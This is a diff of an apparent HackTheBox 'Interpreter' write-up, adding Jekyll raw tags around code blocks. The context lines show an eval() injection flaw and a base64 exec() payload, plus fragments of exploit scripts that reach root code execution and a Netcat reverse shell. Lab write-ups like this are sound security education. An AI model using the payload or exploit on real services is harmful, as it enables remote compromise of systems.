@@ -226,6 +226,7 @@ The target machine had curl completely removed from the environment. To test the
 
 After figuring out the right field names and date format (MM/DD/YYYY), a valid request looks like:
 
+{% raw %}
 ```Python
 cat << 'EOF' > endpoint.py
 import urllib.request
@@ -243,6 +244,7 @@ print(urllib.request.urlopen(req).read().decode())
 EOF
 Patient John Doe (M), 36 years old, received from TEST at 20250101120000
 ```
+{% endraw %}
 
 
 ![Interpreter](htb_interpreter_addpatient.png)
@@ -278,6 +280,7 @@ We have **root-level code execution** through the Flask app.
 
 After exfiltrating `notif.py`, the vulnerability is clear:
 
+{% raw %}
 ```python
 def template(first, last, sender, ts, dob, gender):
     pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
@@ -291,9 +294,11 @@ def template(first, last, sender, ts, dob, gender):
     except Exception as e:
         return f"[EVAL_ERROR] {e}"
 ```
+{% endraw %}
 
 The app builds an f-string by embedding user input, then passes the whole thing to `eval()`. The input validation regex allows `{` and `}`, so we can inject arbitrary Python expressions that get evaluated.
 
+{% raw %}
 ```python
 cat << 'EOF' > grab_glags.py
 import urllib.request
@@ -315,6 +320,7 @@ except Exception as e:
     pass
 EOF
 ```
+{% endraw %}
 
 [grab_flags.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Interpreter/grab_flags.py "Results")
 
@@ -329,6 +335,8 @@ Base64-encode that script, then inject:
 {exec(__import__("base64").b64decode("...encoded script...").decode())}
 ```
 
+
+{% raw %}
 ```python (PoC)
 cat << 'EOF' > exploit.py
 import urllib.request
@@ -374,6 +382,7 @@ except Exception as e:
     print(f"[+] Exploit triggered! Check your Netcat listener on port {kali_port}.")
 EOF
 ```
+{% endraw %}
 
 
 [exploit.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Interpreter/exploit.py "Results")
